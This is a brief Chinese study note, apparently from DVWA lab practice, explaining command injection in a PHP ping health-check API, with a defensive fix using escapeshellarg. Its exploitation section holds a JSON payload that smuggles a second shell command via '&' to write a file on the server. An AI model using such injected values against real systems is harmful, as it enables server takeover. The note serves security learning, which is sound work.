# API 命令注入

## 原理

健康检查接口调 `exec("ping -c 4 " + 用户输入)`——输入直接拼进系统命令。

```php
exec("ping -c 4 " . $input['target'], $output, $ret_var);
//               ↑ 你的输入原样拼进去
```

## 利用

```json
{"target":"127.0.0.1 & echo pwned > D:\phpstudy_pro\WWW\DVWA-master\DVWA-master\hackable\uploads\pwned.txt"}
```

`&` 在命令行含义："前面的跑完继续跑后面的"。ping 完了 echo 执行 → 文件创建成功。

## 费曼版

快递站自助查询机让你输单号。你输入"查询单号 && 打开保险柜"——它不检查，两件事都做了。

## 危害

任意系统命令 → 读配置/反弹 shell → 整个服务器沦陷。

## 防护

```php
exec("ping -c 4 " . escapeshellarg($target));
// 输入 127.0.0.1 & dir → 变成带引号的参数，& 失效
```

更好：用 PHP 内置函数代替系统命令。
